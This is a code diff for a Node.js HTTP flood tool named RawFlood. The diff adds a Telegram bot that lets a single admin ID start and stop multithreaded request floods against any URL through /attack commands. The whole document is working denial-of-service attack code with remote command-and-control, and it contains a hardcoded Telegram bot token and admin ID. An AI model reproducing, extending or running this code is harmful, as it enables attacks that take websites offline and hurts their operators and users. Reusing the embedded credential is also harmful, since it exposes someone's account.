@@ -1,7 +1,7 @@
 const http = require('http');
 const https = require('https');
 const url = require('url');
-const readline = require('readline');
+const { exec } = require('child_process');
 
 class RawFlood {
     constructor() {
@@ -12,7 +12,7 @@ class RawFlood {
         };
         this.startTime = Date.now();
         this.isRunning = false;
-        this.workers = [];
+        this.attackProcess = null;
     }
 
     async floodTarget(target, time, rate, threads) {
@@ -27,41 +27,25 @@ class RawFlood {
         console.log(`⏱️ Time: ${time}s`);
         console.log(`⚡ Rate: ${rate}ms`);
         console.log(`🧵 Threads: ${threads}`);
-        console.log(`💥 Mode: Raw Flood (No Bypass)`);
-        console.log(`⏹️ Type '/stop' to cancel attack\n`);
+        console.log(`💥 Mode: Raw Flood (No Bypass)\n`);
 
-        this.setupStopListener();
-
+        const workers = [];
+        
         for (let i = 0; i < threads; i++) {
-            this.workers.push(this.createWorker(protocol, parsedUrl, rate, endTime, i));
+            workers.push(this.createWorker(protocol, parsedUrl, rate, endTime, i));
         }
 
         const statsInterval = setInterval(() => {
             this.displayStats();
             if (Date.now() >= endTime || !this.isRunning) {
                 clearInterval(statsInterval);
-                this.cleanup();
+                this.isRunning = false;
                 console.log('\n✅ Attack completed!');
                 process.exit(0);
             }
         }, 2000);
 
-        await Promise.all(this.workers);
-    }
-
-    setupStopListener() {
-        const rl = readline.createInterface({
-            input: process.stdin,
-            output: process.stdout
-        });
-
-        rl.on('line', (input) => {
-            if (input.trim().toLowerCase() === '/stop') {
-                console.log('\n🛑 Stopping attack...');
-                this.stop();
-                rl.close();
-            }
-        });
+        await Promise.all(workers);
     }
 
     createWorker(protocol, target, rate, endTime, workerId) {
@@ -125,14 +109,154 @@ class RawFlood {
 
     stop() {
         this.isRunning = false;
-        this.cleanup();
+        console.log('\n🛑 Attack stopped by Telegram bot command');
         this.displayStats();
-        console.log('\n🛑 Attack stopped by user command /stop');
         process.exit(0);
     }
+}
 
-    cleanup() {
-        this.workers = [];
+class TelegramBot {
+    constructor() {
+        this.token = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k';
+        this.adminId = '6142661532';
+        this.baseUrl = `https://api.telegram.org/bot${this.token}`;
+        this.flood = new RawFlood();
+        this.activeAttack = null;
+    }
+
+    async sendMessage(chatId, text) {
+        try {
+            const response = await fetch(`${this.baseUrl}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Send message error:', error);
+        }
+    }
+
+    async handleUpdate(update) {
+        if (!update.message) return;
+        
+        const chatId = update.message.chat.id;
+        const text = update.message.text;
+        const userId = update.message.from.id;
+
+        if (userId.toString() !== this.adminId) {
+            await this.sendMessage(chatId, '❌ Unauthorized access');
+            return;
+        }
+
+        if (text === '/start') {
+            await this.sendMessage(chatId, 
+                '🤖 Raw Flood Bot\n\n' +
+                'Commands:\n' +
+                '/start - Show help\n' +
+                '/attack target time rate thread - Start attack\n' +
+                '/stop - Stop current attack\n' +
+                'Example: /attack https://example.com/ 60 100 10'
+            );
+        } else if (text.startsWith('/attack ')) {
+            await this.handleAttackCommand(chatId, text);
+        } else if (text === '/stop') {
+            await this.handleStopCommand(chatId);
+        }
+    }
+
+    async handleAttackCommand(chatId, text) {
+        const args = text.split(' ').slice(1);
+        
+        if (args.length < 4) {
+            await this.sendMessage(chatId, 
+                '❌ Invalid format\n' +
+                'Usage: /attack target time rate thread\n' +
+                'Example: /attack https://example.com/ 60 100 10'
+            );
+            return;
+        }
+
+        const [target, time, rate, thread] = args;
+        
+        if (!target.startsWith('http')) {
+            await this.sendMessage(chatId, '❌ Invalid target URL');
+            return;
+        }
+
+        if (this.activeAttack) {
+            await this.sendMessage(chatId, '⚠️ Another attack is already running. Use /stop first.');
+            return;
+        }
+
+        await this.sendMessage(chatId, '🔄 Starting attack...');
+
+        this.activeAttack = {
+            target: target,
+            time: parseInt(time),
+            rate: parseInt(rate),
+            thread: parseInt(thread),
+            startTime: Date.now()
+        };
+
+        setTimeout(() => {
+            this.startFloodAttack(target, time, rate, thread, chatId);
+        }, 1000);
+    }
+
+    async handleStopCommand(chatId) {
+        if (!this.activeAttack) {
+            await this.sendMessage(chatId, '❌ No active attack to stop');
+            return;
+        }
+
+        await this.sendMessage(chatId, '🛑 Stopping attack...');
+        
+        if (this.flood.isRunning) {
+            this.flood.stop();
+        }
+        
+        this.activeAttack = null;
+        await this.sendMessage(chatId, '✅ Attack stopped successfully');
+    }
+
+    startFloodAttack(target, time, rate, thread, chatId) {
+        console.log(`Starting Telegram bot attack: ${target} ${time}s ${rate}ms ${thread} threads`);
+        
+        this.flood.floodTarget(target, time, rate, thread).then(() => {
+            this.activeAttack = null;
+            this.sendMessage(chatId, `✅ Attack completed!\nTarget: ${target}\nDuration: ${time}s`);
+        }).catch(error => {
+            console.error('Attack error:', error);
+            this.activeAttack = null;
+            this.sendMessage(chatId, '❌ Attack failed: ' + error.message);
+        });
+    }
+
+    async startPolling() {
+        let offset = 0;
+        
+        while (true) {
+            try {
+                const response = await fetch(`${this.baseUrl}/getUpdates?offset=${offset}&timeout=60`);
+                const data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        await this.handleUpdate(update);
+                        offset = update.update_id + 1;
+                    }
+                }
+            } catch (error) {
+                console.error('Polling error:', error);
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
+        }
     }
 }
 
@@ -141,20 +265,20 @@ if (require.main === module) {
     
     if (args.length === 4) {
         const [target, time, rate, thread] = args;
-        
-        if (!target.startsWith('http')) {
-            console.log('❌ Invalid target URL. Must start with http:// or https://');
-            process.exit(1);
-        }
-
         const flood = new RawFlood();
         flood.floodTarget(target, parseInt(time), parseInt(rate), parseInt(thread));
+    } else if (args.length === 0) {
+        const bot = new TelegramBot();
+        console.log('🤖 Telegram Bot Started...');
+        bot.startPolling();
     } else {
-        console.log('Usage: node rawflood.js <target> <time> <rate> <threads>');
-        console.log('Example: node rawflood.js https://example.com/ 60 10 50');
-        console.log('Commands: Type "/stop" during attack to cancel');
+        console.log('Usage:');
+        console.log('  node rawflood.js target time rate thread');
+        console.log('  node rawflood.js (to start Telegram bot)');
+        console.log('\nExamples:');
+        console.log('  node rawflood.js https://example.com/ 60 100 10');
         process.exit(1);
     }
 }
 
-module.exports = RawFlood;module.exports = RawFlood;
+module.exports = { RawFlood, TelegramBot };
